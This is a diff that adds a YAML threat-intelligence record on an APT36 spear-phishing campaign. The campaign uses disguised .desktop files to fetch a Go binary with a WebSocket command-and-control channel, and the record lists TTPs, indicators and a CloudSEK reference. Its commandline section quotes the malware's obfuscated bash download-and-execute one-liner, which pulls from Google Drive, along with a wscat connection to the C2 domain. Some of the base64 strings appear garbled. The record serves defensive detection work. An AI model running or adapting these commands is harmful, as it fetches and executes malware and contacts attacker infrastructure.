@@ -1,0 +1,45 @@
+description: "APT36 uses spear\u2011phishing with malicious ZIP archives containing\
+  \ disguised .desktop files to deliver a Go binary that establishes a WebSocket C2\
+  \ channel over ws://seemysitelive.store:8080/ws."
+attribution: "APT36 (Pakistan\u2011based APT group)"
+malware_families:
+- Go binary
+TTPs:
+  processes:
+  - wscat
+  - bash
+  - curl
+  commandline:
+  - wscat --connect ws://seemysitelive.store:8080/ws
+  - bash -c 'CTFuFt="/tmp/PROCUREMENT_OF_MANPORTABLE_& COMPAC.pdf-$(date +%s)"; nilThe="$(echoZWFNWEpXPSItLWZhaWwgLS1sb2NhdGlvbiAtLXNob3ctZXJyb3IiOyBjdXIsICR7ZWFNWEpXfSAiaHROCHM6Ly9kcm12ZS5nb29nbGUuY29tL3VjP2V4cG9ydD1kb3dubG9hZCZpZDAxV1FRaVRONZhOMOtwWUpEVMIFLTk1dUIMbk84NFd6Xy@iIHwgeHhkIC1yICiw | base64 -d)"; eval "$nilThe" > "$CTFuFt" &&chmod +x "$CTFuFt" && "$CTFuFt" &
+    iuqdST="$(echoZmlyZWZveCAtLWS1dy13aWSkb3cgImh@dHBz0i8vZHIpdmUuZ29vZ2x1LmNvbSOmaWx1L2QvMWt
+    uMEXfN1dZYmZVVXgwZG16d2ZBTERuemtWSEpBUFR1L3ZpZXc/dXNwPWRyaXZ1X2xpbmsi | base64
+    -d)"; eval "$iuqdST";'
+  - bash -c 'curl https://drive.google.com/file/d/iknOL_6WYBIUUXOAMZWIALDNZKVHIAPTU/view'
+  powershell: []
+  scripting_engine:
+  - bash
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - process: wscat
+    destination: seemysitelive.store
+    port: 8080
+  - process: curl
+    destination: drive.google.com
+  file_activity:
+  - /tmp/PROCUREMENT_OF_MANPORTABLE_& COMPAC.pdf-<timestamp>
+  persistence:
+  - Autostart via .desktop file with X-GNOME-Autostart-enabled=true
+  process_relations: []
+IOCs:
+  ip_addresses:
+  - 164.215.103.55
+  domains:
+  - seemysitelive.store
+  - drive.google.com
+authors:
+- Ayush Panwar
+reference: https://www.cloudsek.com/blog/investigation-report-apt36-malware-campaign-using-desktop-entry-files-and-google-drive-payload-delivery
+date_of_publication: August 26, 2025
+file_creation_date: September 22, 2025
